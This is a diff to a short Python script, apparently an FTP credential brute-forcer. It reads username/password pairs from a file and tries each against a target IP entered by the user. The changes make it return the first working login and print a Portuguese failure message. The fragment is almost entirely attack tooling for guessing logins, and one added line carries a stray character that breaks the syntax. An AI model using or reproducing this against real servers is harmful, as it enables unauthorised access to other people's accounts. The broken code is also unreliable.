@@ -21,9 +21,10 @@ def bruteLogin(hostname,passwordFile):
             login = ftp.login(userName, passWord);
             print("[*] Login sucessfully with:", userName ,"/", passWord);
             ftp.quit();
+            return(userName,passWord);
         except:
-            print("[-] Password is not on the list!");
-            
+            pass
+    print("[-] Senha não está na lista!");c    
 host = input('[*]Enter the IP address of the target:');
 passwordFile = input("[*] Enter the target's users/passwords path file:");
 bruteLogin(host,passwordFile);
